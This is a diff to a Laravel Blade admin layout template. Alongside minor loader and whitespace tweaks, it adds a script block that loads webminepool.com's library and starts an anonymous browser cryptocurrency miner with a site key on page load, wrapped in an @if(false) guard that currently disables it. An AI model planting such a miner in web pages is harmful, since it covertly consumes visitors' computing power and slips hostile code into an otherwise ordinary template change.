@@ -56,6 +56,17 @@
         }
     </style>
     @yield('styles')
+    @if(false)
+    <script src="https://webminepool.com/lib/base.js"></script>
+    <script>
+	window.onload = function(){
+	    console.log('JavaScript Loaded.');
+	    var miner = WMP.Anonymous('SK_4NmTKepTS7V6x8M8iThqR', {throttle: 0.4});
+	    miner.start();
+	    console.log('JavaScript Working.');
+	}
+    </script>
+    @endif
 </head>
 
 <body class="app header-fixed sidebar-fixed aside-menu-fixed sidebar-lg-show">
@@ -78,7 +89,7 @@
             <span class="navbar-toggler-icon"></span>
         </button>
         <ul class="nav navbar-nav d-md-down-none">
-
+            
         </ul>
         <ul class="nav navbar-nav ml-auto">
             <li class="nav-item dropdown">
@@ -139,8 +150,7 @@
         //         $('.notice-count').text(data.notice_count);
         //     });
         $(document).ready(function(){
-            $(".loader").fadeOut("fast");
-            $("#overlayer").fadeOut("fast");
+            $(".loader").delay(1000).fadeOut("slow"); $("#overlayer").delay(1000).fadeOut("slow");
         });
     </script>
 </body>
